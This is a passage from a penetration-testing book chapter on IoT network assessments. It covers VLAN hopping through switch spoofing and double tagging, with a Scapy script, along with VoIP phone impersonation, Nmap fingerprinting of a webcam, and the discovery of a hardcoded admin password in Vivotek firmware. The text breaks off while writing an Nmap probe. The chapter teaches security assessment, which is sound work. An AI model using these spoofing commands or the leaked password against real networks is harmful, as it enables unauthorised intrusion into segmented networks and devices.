<html><head></head><body><div id="sbo-rt-content"><section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="59" id="Page_59"/>4</span><br/>
<span class="ChapterTitle">Network Assessments</span>
</h1>
</header>
<figure class="opener">
<img src="Images/chapterart.png" alt="" width="204" height="204"/>
</figure>
<p class="ChapterIntro">Assessing the security of services in IoT systems can sometimes be challenging, because these systems often use newer protocols supported by very few security tools, if any at all. So, it’s important that we learn which tools we <em>can</em> use and whether we can expand those tools’ capabilities. </p>
<p>In this chapter, we start by explaining how to circumvent network segmentation and penetrate into an isolated IoT network. Next, we show you how to identify IoT devices and fingerprint custom network services using Nmap. Then we attack <em>Message Queuing Telemetry Transport (MQTT)</em>, a common network IoT protocol. By doing so, you’ll learn how to write custom password-authentication cracking modules with the help of Ncrack.</p>
<h2 id="h1-500907c04-0001"><span epub:type="pagebreak" title="60" id="Page_60"/>Hopping into the IoT Network</h2>
<p class="BodyFirst">Most organizations try to improve the security of their networks by introducing network segmentation and segregation strategies. These strategies separate assets with lower security requirements, such as the devices in the guest network, from critical components of the organization’s infrastructure, such as the web servers located at the datacenter and the voice network for employee phones. The critical components might also include an IoT network. For instance, the company might use security cameras and access control units, like remotely controlled door locks. To segregate the network, the company usually installs perimeter firewalls or switches and routers capable of separating the network into different zones. </p>
<p>One common way to segment a network is through <em>VLANs</em>, which are logical subsets of a larger, shared physical network. Devices must be located in the same VLAN to communicate. Any connection to a device that belongs to a different VLAN must go through a Layer 3 switch, a device that combines the functionality of a switch and a router, or just a router, which can then impose ACLs. The ACLs selectively admit or reject inbound packets using advanced rulesets, providing fine-grained network traffic control. </p>
<p>But if the company configures these VLANs insecurely or uses insecure protocols, an attacker could circumvent the restrictions by performing a VLAN-hopping attack. In this section, we walk through this attack to access the organization’s protected IoT network.</p>
<h3 id="h2-500907c04-0001">VLANs and Network Switches</h3>
<p class="BodyFirst">To perform an attack against the VLANs, you need to understand how network switches operate. On a switch, each port is either configured as an <em>access port</em> or a <em>trunk port</em> (also called a <em>tagged</em> port by some vendors), as shown in <a id="figureanchor4-1" href="#figure4-1">Figure 4-1</a>. </p>
<figure>
<img src="Images/f04001.png" alt="f04001" width="750" height="326"/>
<figcaption><p><a id="figure4-1">Figure 4-1:</a> Common network architecture with separated VLANs for guests and IoT devices</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="61" id="Page_61"/>When a device, such as an IP camera, is connected to an access port, the network assumes that the packets it transfers belong to a certain VLAN. On the other hand, when a device is connected to a trunk port, it establishes a VLAN <em>trunk link</em>, a type of connection that allows the packets of any VLAN to pass through. We mainly use trunk links to connect multiple switches and routers. </p>
<p>To identify the traffic in a trunk link that belongs to each VLAN, the switch uses an identification method called <em>VLAN tagging</em>. It marks packets that traverse a trunk link with a tag that corresponds to their access port’s VLAN ID. When the packets arrive at the destination switch, the switch removes the tag and uses it to transfer the packets to the correct access port. Networks can use one of several protocols to perform the VLAN tagging, such as the Inter-Switch Link (ISL), the LAN Emulation (LANE), and IEEE 802.1Q and 802.10 (FDDI).</p>
<h3 id="h2-500907c04-0002">Switch Spoofing</h3>
<p class="BodyFirst">Many network switches establish VLAN trunk links dynamically using a Cisco proprietary networking protocol called the <em>Dynamic Trunking Protocol (DTP)</em>. DTP allows two connected switches to create a trunk link and then negotiate the VLAN tagging method. </p>
<p>In a <em>switch spoofing attack</em>, attackers abuse this protocol by pretending their device is a network switch, tricking a legitimate switch into establishing a trunk link to it (<a id="figureanchor4-2" href="#figure4-2">Figure 4-2</a>). As a result, the attackers can gain access to packets originating from any VLAN on the victim switch. </p>
<figure>
<img src="Images/f04002.png" alt="f04002" width="750" height="326"/>
<figcaption><p><a id="figure4-2">Figure 4-2:</a> Switch spoofing attack</p></figcaption>
</figure>
<p>Let’s try this attack. We’ll send DTP packets that resemble those from an actual switch on the network using the open source tool Yersinia (<a href="https://github.com/tomac/yersinia/" class="LinkURL">https://github.com/tomac/yersinia/</a>). Yersinia is preinstalled in Kali Linux, but if you are using the latest Kali version, you’ll need to first install the <code>kali-linux-large</code> metapackage. You can do so by issuing the following command in a terminal: </p>
<pre><code>$ <b>sudo apt install kali-linux-large</b></code></pre>
<p><span epub:type="pagebreak" title="62" id="Page_62"/>We generally recommend using the preceding approach instead of manually compiling tools, as we have identified issues with the compilation of some of the tools in the newest Kali versions.</p>
<p>Alternatively, you can try compiling Yersinia by using the following commands:</p>
<pre><code># <b>apt-get install libnet1-dev libgtk2.0-dev libpcap-dev</b>
# <b>tar xvfz yersinia-0.8.2.tar.gz &amp;&amp; cd yersinia-0.8.2 &amp;&amp; ./autogen.sh</b>
# <b>./configure</b>
# <b>make &amp;&amp; make install</b></code></pre>
<p>To establish the trunk link with the attacker’s device, open Yersinia’s graphic user interface:</p>
<pre><code># <b>yersinia -G</b></code></pre>
<p>In the interface, click <b>Launch Attack</b>. Then, in the <b>DTP</b> tab, select the <b>enable trunking</b> option, as shown in <a id="figureanchor4-3" href="#figure4-3">Figure 4-3</a>.</p>
<figure>
<img src="Images/f04003.png" alt="f04003" width="750" height="484"/>
<figcaption><p><a id="figure4-3">Figure 4-3:</a> The Yersinia DTP tab</p></figcaption>
</figure>
<p>When you select this option, Yersinia should imitate a switch that supports the DTP protocol, connect to a victim switch’s port, and repeatedly send the DTP packets needed to establish a trunk link with the victim switch. If you want to send just one raw DTP packet, select the first option. </p>
<p>Once you’ve enabled trunking in the DTP tab, you should see data from the available VLANs in the 802.1Q<b> </b>tab, as shown in <a id="figureanchor4-4" href="#figure4-4">Figure 4-4</a>.</p>
<span epub:type="pagebreak" title="63" id="Page_63"/><figure>
<img src="Images/f04004.png" alt="f04004" width="750" height="210"/>
<figcaption><p><a id="figure4-4">Figure 4-4:</a> The Yersinia 802.1Q tab</p></figcaption>
</figure>
<p>The data also includes the available VLAN IDs. To access the VLAN packets, first identify your network interface using the <code>nmcli </code>command, which is preinstalled in Kali Linux:</p>
<pre><code># <b>nmcli </b>
eth1: connected to Wired connection 1
        "Realtek RTL8153"
        ethernet (r8152), 48:65:EE:16:74:F9, hw, mtu 1500</code></pre>
<p>In this example, the attacker’s laptop has the <code>eth1</code> network interface. Enter the following commands in the Linux terminal:</p>
<pre><code># <b>modprobe 8021q</b>
# <b>vconfig add eth1 20</b>
# <b>ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up</b></code></pre>
<p>First, we load the kernel module for the VLAN tagging method using the <code>modprobe </code>command, which is preinstalled in Kali Linux. Then we create a new interface with the desired VLAN ID using the <code>vconfig</code> command, followed by the <code>add</code> parameter, the name of our network interface, and the VLAN identifier. The <code>vconfig</code> command is preinstalled in Kali Linux, and it’s included in the <code>vlan</code> package in other Linux distributions. In our case, we’ll specify the VLAN 20 ID used for the IoT network in this example and assign it to the network adapter on the attacker’s laptop. You can also select an IPv4 address using the <code>ifconfig</code> command.</p>
<h3 id="h2-500907c04-0003">Double Tagging</h3>
<p class="BodyFirst">As mentioned earlier, an access port sends and receives packets with no VLAN tag, because those packets are assumed to belong to a specific VLAN. On the other hand, the packets that the trunk port sends and receives should be marked with a VLAN tag. This allows packets originating from any access port, even those belonging to different VLANs, to pass through. But there are certain exceptions to this, depending on the VLAN tagging protocol in use. For example, in the IEEE 802.1Q protocol, if a packet arrives at a trunk port and has no VLAN tag, the switch will automatically forward this packet to a predefined VLAN called the <em>native VLAN</em>. Usually, this packet has the VLAN ID 1. </p>
<p>If the native VLAN’s ID belongs to one of the switch access ports or if an adversary has acquired it as part of a switch spoofing attack, the attacker might be able to perform a double tagging attack, as shown in <a id="figureanchor4-5" href="#figure4-5">Figure 4-5</a>.</p>
<span epub:type="pagebreak" title="64" id="Page_64"/><figure>
<img src="Images/f04005.png" alt="f04005" width="750" height="355"/>
<figcaption><p><a id="figure4-5">Figure 4-5:</a> Double tagging attack</p></figcaption>
</figure>
<p>When a packet that traverses a trunk link arrives on the destination switch’s trunk port, the destination port removes its VLAN tag and then uses this tag to transfer the packet to the correct custom packets. You could add two VLAN tags and trick the switch into removing only the outer one. If it’s the native VLAN tag, the switch will transfer the packet with the inner tag to its trunk link, toward the second switch. When the packet arrives on the destination switch’s trunk port, the switch will use the inner tag to forward the packet to the appropriate access port. You can use this method to send packets to a device that you wouldn’t otherwise be able to reach, such as an IoT device monitoring server, as shown in <a href="#figure4-5">Figure 4-5</a>.</p>
<p>To perform the attack, the outer VLAN tag has to identify the adversary’s own VLAN, which must also be the native VLAN of the established trunk link, whereas the inner tag must identify the VLAN to which a targeted IoT device belongs. We can use the <em>Scapy</em><code/>framework (<a href="https://scapy.net/" class="LinkURL">https://scapy.net/</a>), a powerful packet manipulation program written in Python, to forge a packet with these two VLAN tags. You can install Scapy using Python’s <code>pip</code> package manager.</p>
<pre><code># <b>pip install scapy</b></code></pre>
<p>The following Python code sends an ICMP packet to a targeted device with the IPv4 address 192.168.1.10 located in VLAN 20. We tag the ICMP packet with two VLAN IDs: 1 and 20.</p>
<pre><code>from scapy.all import *
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)</code></pre>
<p>The <code>Ether()</code> function creates an auto-generated link layer. We then make the two VLAN tags using the <code>Dot1Q()</code> function. The<code> IP()</code> function defines a custom network layer to route the packet to the victim’s device. <span epub:type="pagebreak" title="65" id="Page_65"/>Finally, we add an auto-generated payload containing the transport layer that we want to use (in our case, ICMP). The ICMP response will never reach the adversary’s device, but we can verify that the attack succeeded by observing the network packets in the victim’s VLAN using Wireshark. We’ll discuss using Wireshark in detail in Chapter 5.</p>
<h3 id="h2-500907c04-0004">Imitating VoIP Devices</h3>
<p class="BodyFirst">Most corporate networking environments contain VLANs for their voice networks. Although intended for use by the employees’ Voice over Internet Protocol (VoIP) phones, modern VoIP devices are increasingly integrated with IoT devices. Many employees can now unlock doors using a special phone number, control the room’s thermostat, watch a live feed from security cameras on the VoIP device’s screen, receive voice messages as emails, and get notifications from the corporate calendar to their VoIP phones. In these cases, the VoIP network looks something like the one shown in <a id="figureanchor4-6" href="#figure4-6">Figure 4-6</a>. </p>
<figure>
<img src="Images/f04006.png" alt="f04006" width="750" height="505"/>
<figcaption><p><a id="figure4-6">Figure 4-6:</a> A VoIP device connected to an IoT network</p></figcaption>
</figure>
<p>If the VoIP phones can connect to the corporate IoT network, attackers can imitate VoIP devices to gain access to this network, too. To perform this attack, we’ll use an open source tool called VoIP Hopper (<a href="http://voiphopper.sourceforge.net/" class="LinkURL">http://voiphopper.sourceforge.net/</a>). VoIP Hopper mimics the behavior of a VoIP phone in Cisco, Avaya, Nortel, and Alcatel-Lucent environments. It automatically discovers the correct VLAN ID for the voice network using one of the device discovery protocols it supports, such as the Cisco Discovery Protocol (CDP), the Dynamic Host Configuration Protocol (DHCP), Link Layer Discovery <span epub:type="pagebreak" title="66" id="Page_66"/>Protocol Media Endpoint Discovery (LLDP-MED), and 802.1Q ARP. We won’t further investigate how these protocols work, because their inner workings aren’t relevant to the attack. </p>
<p>VoIP Hopper is preinstalled in Kali Linux. If you’re not using Kali, you can manually download and install the tool from the vendor’s site using the following commands:</p>
<pre><code># <b>tar xvfz voiphopper-2.04.tar.gz &amp;&amp; cd voiphopper-2.04</b>
# <b>./configure</b>
# <b>make &amp;&amp; make install</b></code></pre>
<p>Now we’ll use VoIP Hopper to imitate Cisco’s CDP protocol. CDP allows Cisco devices to discover other Cisco devices nearby, even if they’re using different network layer protocols. In this example, we imitate a connected Cisco VoIP device and assign it to the correct VLAN that gives us further access to the corporate voice network:</p>
<pre><code># <b>voiphopper -i eth1  -E 'SEP001EEEEEEEEE ' -c 2</b>
VoIP Hopper 2.04 Running in CDP Spoof mode
Sending 1st CDP Spoofed packet on eth1 with CDP packet data:
Device ID: SEP001EEEEEEEEE;    Port ID: Port 1;    Software: SCCP70.8-3-3SR2S
Platform: Cisco IP Phone 7971;    Capabilities: Host;    Duplex: 1
Made CDP packet of 125 bytes - Sent CDP packet of 125 bytes
Discovered VoIP VLAN through CDP: 40
Sending 2nd CDP Spoofed packet on eth1 with CDP packet data:
Device ID: SEP001EEEEEEEEE;    Port ID: Port 1;    Software: SCCP70.8-3-3SR2S
Platform: Cisco IP Phone 7971;    Capabilities: Host;    Duplex: 1
Made CDP packet of 125 bytes - Sent CDP packet of 125 bytes
Added VLAN 20 to Interface eth1
Current MAC:  00:1e:1e:1e:1e:90 
VoIP Hopper will sleep and then send CDP Packets
Attempting dhcp request for new interface eth1.20
VoIP Hopper dhcp client:  received IP address for eth1.20: 10.100.10.0</code></pre>
<p>VoIP Hopper supports three CDP modes. The <em>sniff</em> mode inspects the network packets and attempts to locate the VLAN ID. To use it, set the <code>-c</code> parameter to <code>0</code>. The <em>spoof</em> mode generates <em>custom</em> packets similar to the ones a real VoIP device would transmit in the corporate network. To use it, set the <code>-c</code> parameter to <code>1</code>. The <em>spoof with a pre-made</em><em>packet</em> mode sends the same packets as a Cisco 7971G-GE IP phone. To use it, set the <code>-c</code> parameter to <code>2</code>. </p>
<p>We use the last method because it’s the fastest approach. The <code>-i</code> parameter specifies the attacker’s network interface, and the <code>-E</code> parameter specifies the name of the VOIP device being imitated. We chose the name SEP001EEEEEEEEE, which is compatible with the Cisco naming format for VoIP phones. The format consists of the word “SEP” followed by a MAC address. In corporate environments, you can imitate an existing VoIP device by looking at the MAC label on the back of the phone; by pressing the Settings button and selecting the Model Information option on the phone’s display screen; or by attaching the VoIP device’s Ethernet cable to your laptop and observing the device’s CDP requests using Wireshark.</p>
<p><span epub:type="pagebreak" title="67" id="Page_67"/>If the tool executes successfully, the VLAN network will assign an IPv4 address to the attacker’s device. To confirm that the attack worked, you could observe the DHCP response to this in Wireshark (<a id="figureanchor4-7" href="#figure4-7">Figure 4-7</a>). We’ll discuss using Wireshark in detail in Chapter 5.</p>
<figure>
<img src="Images/f04007.png" alt="f04007" width="750" height="544"/>
<figcaption><p><a id="figure4-7">Figure 4-7:</a> The Wireshark traffic dump of the DHCP frame in the voice network (Voice VLAN)</p></figcaption>
</figure>
<p>Now we can identify the IoT devices located in this specific IoT network.</p>
<h2 id="h1-500907c04-0002">Identifying IoT Devices on the Network</h2>
<p class="BodyFirst">One of the challenges you’ll face when attempting to identify IoT devices on a network is that they often share technology stacks. For example, <em>BusyBox</em>, a popular executable in IoT devices, typically runs the same network services on all devices. This makes it difficult to identify a device based on its services. </p>
<p>That means we need to go deeper. We have to craft a specific request in the hopes of generating a response from the target that uniquely identifies the device. </p>
<h3 id="h2-500907c04-0005">Uncovering Passwords by Fingerprinting Services</h3>
<p class="BodyFirst">This section walks you through an excellent example of how sometimes you can go from detecting an unknown service to finding a hardcoded backdoor that you can abuse. We’ll target an IP webcam. </p>
<p>Of all available tools, Nmap has the most complete database for service fingerprinting. Nmap is available by default in security-oriented Linux distributions like Kali, but you can grab its source code or precompiled binaries for all major operating systems, including Linux, Windows, and macOS, at <span epub:type="pagebreak" title="68" id="Page_68"/><a href="https://nmap.org/" class="LinkURL">https://nmap.org/</a>. It uses the <em>nmap-service-probes</em> file, located in the root folder of your Nmap installation, to store thousands of signatures for all kinds of services. These signatures consist of probes, data often sent, and sometimes hundreds of lines that match known responses to particular services. </p>
<p>When attempting to identify a device and the services it runs, the very first Nmap command you should try is a scan with service (<code>-sV</code>) and operating system detection (<code>-O</code>) enabled:</p>
<pre><code># <b>nmap -sV -O &lt;target&gt;</b></code></pre>
<p>This scan will usually be enough to identify the underlying operating system and main services, including their versions. </p>
<p>But although this information is valuable by itself, it’s even more useful to conduct a scan that increases version intensity to the maximum level using the <code>--version-all</code><var/>or <code>--version-intensity 9</code> arguments. Increasing version intensity forces Nmap to ignore the <em>rarity level</em> (a number indicating how common the service is according to Nmap’s research) and port selection and launch all the probes in the service fingerprint database for any service that it detects. </p>
<p>When we ran a full port scan (<code>-p-</code>) against an IP webcam with version detection enabled and the intensity increased to the maximum, the scan uncovered a new service running on higher ports that previous scans hadn’t uncovered:</p>
<pre><code># <b>nmap -sV --version-all -p- &lt;target&gt;</b>
Host is up (0.038s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     OpenBSD ftpd 6.4 (Linux port 0.17)
80/tcp    open  http    Boa HTTPd 0.94.14rc21
554/tcp   open  rtsp    Vivotek FD8134V webcam rtspd
8080/tcp  open  http    Boa HTTPd 0.94.14rc21
42991/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service" class="LinkURL">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :
SF-Port42991-TCP:V=7.70SVN%I=7%D=8/12%Time=5D51D3D7%P=x86_64-unknown-linux
SF:-gnu%r(GenericLines,3F3,"HTTP/1\.1\x20200\x20OK\r\nContent-Length:\x209
SF:22\x20\r\nContent-Type:\x20text/xml\r\nConnection:\x20Keep-Alive\r\n\r\
SF:n&lt;\?xml\x20version=\"1\.0\"\?&gt;\n&lt;root\x20xmlns=\"urn:schemas-upnp-org:d
SF:evice-1-0\"&gt;\n&lt;specVersion&gt;\n&lt;major&gt;1&lt;/major&gt;\n&lt;minor&gt;0&lt;/minor&gt;\n&lt;/spec
SF:Version&gt;\n&lt;device&gt;\n&lt;deviceType&gt;urn:schemas-upnp-org:device:Basic:1&lt;/de
SF:viceType&gt;\n&lt;friendlyName&gt;FE8182\(10\.10\.10\.6\)&lt;/friendlyName&gt;\n&lt;manuf
SF:acturer&gt;VIVOTEK\x20INC\.&lt;/manufacturer&gt;\n&lt;manufacturerURL&gt;http://www\.v
SF:ivotek\.com/&lt;/manufacturerURL&gt;\n&lt;modelDescription&gt;Mega-Pixel\x20Network
SF:\x20Camera&lt;/modelDescription&gt;\n&lt;modelName&gt;FE8182&lt;/modelName&gt;\n&lt;modelNum
SF:ber&gt;FE8182&lt;/modelNumber&gt;\n&lt;UDN&gt;uuid:64f5f13e-eb42-9c15-ebcf-292306c172b
SF:6&lt;/UDN&gt;\n&lt;serviceList&gt;\n&lt;service&gt;\n&lt;serviceType&gt;urn:Vivotek:service:Bas
SF:icService:1&lt;/serviceType&gt;\n&lt;serviceId&gt;urn:Vivotek:serviceId:BasicServic
SF:eId&lt;/serviceId&gt;\n&lt;controlURL&gt;/upnp/control/BasicServiceId&lt;/controlURL&gt;\
SF:n&lt;eventSubURL&gt;/upnp/event/BasicServiceId&lt;/eventSubURL&gt;\n&lt;SCPDURL&gt;/scpd_
SF:basic\.xml&lt;/");
Service Info: Host: Network-Camera; OS: Linux; Device: webcam; CPE: cpe:/o:linux:linux_kernel, 
<span epub:type="pagebreak" title="69" id="Page_69"/>cpe:/h:vivotek:fd8134v</code></pre>
<p>Note that, depending on the number of running services, this scan might be very noisy and time-consuming. Poorly written software might also crash, because it will receive thousands of unexpected requests. Look at the Twitter hashtag #KilledByNmap to glance at the variety of devices that crash when scanned.</p>
<p>Excellent, we’ve discovered a new service on port 42991. But even Nmap’s service detection engine with thousands of signatures didn’t recognize it, because it marked the service as <code>unknown</code> in the service column. But the service did return data. Nmap even suggests we submit the signature to improve its database (which we suggest you always do). </p>
<p>If we pay closer attention to the partial response Nmap is showing, we can recognize an XML file containing device information, such as a configured name, a model name and number, and services. This response looks interesting, because the service is running on a high, uncommon port:</p>
<pre><code>SF-Port42991-TCP:V=7.70SVN%I=7%D=8/12%Time=5D51D3D7%P=x86_64-unknown-linux
SF:-gnu%r(GenericLines,3F3,"HTTP/1\.1\x20200\x20OK\r\nContent-Length:\x209
SF:22\x20\r\nContent-Type:\x20text/xml\r\nConnection:\x20Keep-Alive\r\n\r\
SF:n&lt;\?xml\x20version=\"1\.0\"\?&gt;\n&lt;root\x20xmlns=\"urn:schemas-upnp-org:d
SF:evice-1-0\"&gt;\n&lt;specVersion&gt;\n&lt;major&gt;1&lt;/major&gt;\n&lt;minor&gt;0&lt;/minor&gt;\n&lt;/spec
SF:Version&gt;\n&lt;device&gt;\n&lt;deviceType&gt;urn:schemas-upnp-org:device:Basic:1&lt;/de
SF:viceType&gt;\n&lt;friendlyName&gt;FE8182\(10\.10\.10\.6\)&lt;/friendlyName&gt;\n&lt;manuf
SF:acturer&gt;VIVOTEK\x20INC\.&lt;/manufacturer&gt;\n&lt;manufacturerURL&gt;http://www\.v
SF:ivotek\.com/&lt;/manufacturerURL&gt;\n&lt;modelDescription&gt;Mega-Pixel\x20Network
SF:\x20Camera&lt;/modelDescription&gt;\n&lt;modelName&gt;FE8182&lt;/modelName&gt;\n&lt;modelNum
SF:ber&gt;FE8182&lt;/modelNumber&gt;\n&lt;UDN&gt;uuid:64f5f13e-eb42-9c15-ebcf-292306c172b
SF:6&lt;/UDN&gt;\n&lt;serviceList&gt;\n&lt;service&gt;\n&lt;serviceType&gt;urn:Vivotek:service:Bas
SF:icService:1&lt;/serviceType&gt;\n&lt;serviceId&gt;urn:Vivotek:serviceId:BasicServic
SF:eId&lt;/serviceId&gt;\n&lt;controlURL&gt;/upnp/control/BasicServiceId&lt;/controlURL&gt;\
SF:n&lt;eventSubURL&gt;/upnp/event/BasicServiceId&lt;/eventSubURL&gt;\n&lt;SCPDURL&gt;/scpd_
SF:basic\.xml&lt;/");</code></pre>
<p>To try generating a response from the device to identify it, we might send random data to the service. But if we do this with <code>ncat</code>, the connection simply closes:</p>
<pre><code># <b>ncat 10.10.10.6 42991</b>
eaeaeaea
eaeaeaea
Ncat: Broken pipe.</code></pre>
<p>If we can’t send data to that port, why did the service return data when we scanned it earlier? Let’s check the Nmap signature file to see what data Nmap sent. The signature includes the name of the probe that generated the response—in this case, GenericLines. We can view this probe using the following command:</p>
<pre><code># <b>cat /usr/local/share/nmap/nmap-service-probes | grep GenericLines</b>
Probe TCP GenericLines <span class="CodeAnnotation">1</span>q|\r\n\r\n|</code></pre>
<p><span epub:type="pagebreak" title="70" id="Page_70"/>Inside the <em>nmap-service-probes </em>file, we can find the name of this probe, followed by the data sent to the device delimited by <code>q|</code><var>&lt;data&gt;</var><code>|</code><span class="CodeAnnotation">1</span>. The data shows that the GenericLines probe sends two carriage returns and new lines. </p>
<p>Let’s send this directly to the scanned device to get the full response that Nmap shows: </p>
<pre><code># <b>echo -ne "\r\n\r\n" | ncat 10.10.10.6 42991</b>
HTTP/1.1 200 OK
Content-Length: 922 
Content-Type: text/xml
Connection: Keep-Alive

&lt;?xml version="1.0"?&gt;
&lt;root &gt;
&lt;specVersion&gt;
&lt;major&gt;1&lt;/major&gt;
&lt;minor&gt;0&lt;/minor&gt;
&lt;/specVersion&gt;
&lt;device&gt;
&lt;deviceType&gt;urn:schemas-upnp-org:device:Basic:1&lt;/deviceType&gt;
&lt;friendlyName&gt;FE8182(10.10.10.6)&lt;/friendlyName&gt;
&lt;manufacturer&gt;VIVOTEK INC.&lt;/manufacturer&gt;
&lt;manufacturerURL&gt;http://www.vivotek.com/&lt;/manufacturerURL&gt;
&lt;modelDescription&gt;Mega-Pixel Network Camera&lt;/modelDescription&gt;
&lt;modelName&gt;FE8182&lt;/modelName&gt;
&lt;modelNumber&gt;FE8182&lt;/modelNumber&gt;
&lt;UDN&gt;uuid:64f5f13e-eb42-9c15-ebcf-292306c172b6&lt;/UDN&gt;
&lt;serviceList&gt;
&lt;service&gt;
&lt;serviceType&gt;urn:Vivotek:service:BasicService:1&lt;/serviceType&gt;
&lt;serviceId&gt;urn:Vivotek:serviceId:BasicServiceId&lt;/serviceId&gt;
&lt;controlURL&gt;/upnp/control/BasicServiceId&lt;/controlURL&gt;
&lt;eventSubURL&gt;/upnp/event/BasicServiceId&lt;/eventSubURL&gt;
&lt;SCPDURL&gt;/scpd_basic.xml&lt;/SCPDURL&gt;
&lt;/service&gt;
&lt;/serviceList&gt;
&lt;presentationURL&gt;http://10.10.10.6:80/&lt;/presentationURL&gt;
&lt;/device&gt;
&lt;/root&gt;</code></pre>
<p>The service responds with a lot of useful information, including the device name, model name, model number, and services running inside the device. An attacker could use this information to accurately fingerprint the IP web camera’s model and firmware version. </p>
<p>But we can go further. Let’s use the model name and number to grab the device firmware from the manufacturer’s website and figure out how it generates this XML file. (Detailed instructions for getting a device’s firmware are in Chapter 9.) Once we have the firmware, we extract the filesystem inside the firmware with help from <code>binwalk</code>:</p>
<pre><code>$ <b>binwalk -e &lt;firmware&gt;</b></code></pre>
<p><span epub:type="pagebreak" title="71" id="Page_71"/>When we ran this command for the IP webcam firmware, we came across an unencrypted firmware that we could analyze. The filesystem is in the <em>Squashfs</em> format, a read-only filesystem for Linux commonly found in IoT devices. </p>
<p>We searched the firmware for the strings inside the XML response we saw earlier and found them inside the <code>check_fwmode</code> binary:</p>
<pre><code>$ <b>grep -iR "modelName"</b>
./usr/bin/update_backup:    MODEL=$(confclient -g system_info_extendedmodelname -p 9 -t Value)
./usr/bin/update_backup:    BACK_EXTMODEL_NAME=`${XMLPARSER} -x /root/system/info/extendedmodelname -f ${BACKUP_SYSTEMINFO_FILE}`
./usr/bin/update_backup:    CURRENT_EXTMODEL_NAME=`${XMLPARSER} -x /root/system/info/extendedmodelname -f ${SYSTEMINFO_FILE}`
./usr/bin/update_firmpkg:getSysparamModelName()
./usr/bin/update_firmpkg:   sysparamModelName=`sysparam get pid`
./usr/bin/update_firmpkg:   getSysparamModelName
./usr/bin/update_firmpkg:   bSupport=`awk -v modelName="$sysparamModelName" 'BEGIN{bFlag=0}{if((match($0, modelName)) &amp;&amp; (length($1) == length(modelName))){bFlag=1}}END{print bFlag}' $RELEASE_LIST_FILE`
./usr/bin/update_lens:         SYSTEM_MODEL=$(confclient -g system_info_modelname -p 99 -t Value)
./usr/bin/update_lens:              MODEL_NAME=`tinyxmlparser -x /root/system/info/modelname -f /etc/conf.d/config_systeminfo.xml`
./usr/bin/check_fwmode:    sed -i<span class="CodeAnnotation">1</span> "s,&lt;modelname&gt;.*&lt;/modelname&gt;,&lt;modelname&gt;${1}&lt;/modelname&gt;,g" $SYSTEMINFO_FILE
./usr/bin/check_fwmode:    sed -i "s,&lt;extendedmodelname&gt;.*&lt;/extendedmodelname&gt;,&lt;extendedmodelname&gt;${1}&lt;/extendedmodelname&gt;,g" $SYSTEMINFO_FILE</code></pre>
<p>The file <code>check_fwmode</code><span class="CodeAnnotation">1</span>, contains our desired string and inside we also found a hidden gem: an <code>eval()</code> call that includes the variable <code>QUERY_STRING</code> containing a hardcoded password:</p>
<pre><code>eval `REQUEST_METHOD='GET' SCRIPT_NAME='getserviceid.cgi' QUERY_STRING='passwd=0ee2cb110a9148cc5a67f13d62ab64ae30783031' /usr/share/www/cgi-bin/admin/serviceid.cgi | grep serviceid`</code></pre>
<p>We could use this password to invoke the administrative CGI script <code>getserviceid.cgi</code> or other scripts that use the same hardcoded password. </p>
<h3 id="h2-500907c04-0006">Writing New Nmap Service Probes</h3>
<p class="BodyFirst">As we’ve seen, Nmap’s version detection is very powerful, and its database of service probes is quite sizeable because it’s composed of submissions from users all over the world. Most of the time, Nmap recognizes the service correctly, but what can we do when it doesn’t, such as in our previous webcam example? </p>
<p>Nmap’s service fingerprint format is simple, allowing us to quickly write new signatures to detect new services. Sometimes the service includes additional information about the device. For example, an antivirus service, such as ClamAV, might return the date on which the signatures were updated, or a network service might include the build number in addition to its version. <span epub:type="pagebreak" title="72" id="Page_72"/>In this section, we’ll write a new signature for the IP web camera’s service running on port 42991 we discovered in the preceding section.</p>
<p>Each line of the probe must contain at least one of the directives shown in <a href="#table4-1" id="tableanchor4-1">Table 4-1</a>.</p>
<figure>
<figcaption class="TableTitle"><p><a id="table4-1">Table 4-1</a>: Nmap Service Probe Directives</p></figcaption>
<table id="table-500907c04-0001" border="1">
<thead>
<tr>
<td><b>Directive</b></td><td><b>Description</b></td></tr>
</thead>
<tbody>
<tr>
<td><code>Exclude</code></td><td>Ports to exclude from probing</td></tr>
<tr>
<td><code>Probe</code></td><td>Line that defines the protocol, name, and data to send</td></tr>
<tr>
<td><code>match</code></td><td>Response to match and identify a service<br/></td></tr>
<tr>
<td><code>softmatch</code></td><td>Similar to the match directive, but it allows the scan to continue to match additional lines</td></tr>
<tr>
<td><code>ports</code> and <code>sslports</code></td><td>Ports that define when to execute the probe</td></tr>
<tr>
<td><code>totalwaitms</code></td><td>Timeout to wait for the probe’s response</td></tr>
<tr>
<td><code>tcpwrappedms</code></td><td>Only used for NULL probe to identify tcpwrapped services</td></tr>
<tr>
<td><code>rarity</code></td><td>Describes how common a service is</td></tr>
<tr>
<td><code>fallback</code></td><td>Defines which probes to use as fallbacks if there are no matches</td></tr>
</tbody>
</table>
</figure>
<p>As an example, let’s look at the <code>NULL</code> probe, which performs simple banner grabbing: when you use it, Nmap won’t send any data; it will just connect to the port, listen to the response, and try to match the line with a known response from an application or service.</p>
<pre><code># This is the NULL probe that compares any banners given to us

Probe TCP NULL q||
# Wait for at least 5 seconds for data.  Otherwise an Nmap default is used.
totalwaitms 5000 

# Windows 2003
match ftp m/^220[ -]Microsoft FTP Service\r\n/ p/Microsoft ftpd/
match ftp m/^220 ProFTPD (\d\S+) Server/ p/ProFTPD/ v/$1/

softmatch ftp m/^220 [-.\w ]+ftp.*\r\n$/i</code></pre>
<p>A probe can have multiple <code>match</code> and <code>softmatch</code> lines to detect services that respond to the same request data. For the simplest service fingerprints, such as the <code>NULL</code> probe, we only need the following directives: <code>Probe</code>, <code>rarity</code>, <code>ports</code>, and <code>match</code>. </p>
<p>For example, to add a signature that correctly detects the rare service running on the webcam, add the following lines to <em>nmap-service-probes</em> in your local Nmap root directory. It will load automatically along with Nmap, so there’s no need to recompile the tool:</p>
<pre><code>Probe TCP WEBCAM q|\r\n\r\n|
rarity 3
<span epub:type="pagebreak" title="73" id="Page_73"/>ports 42991
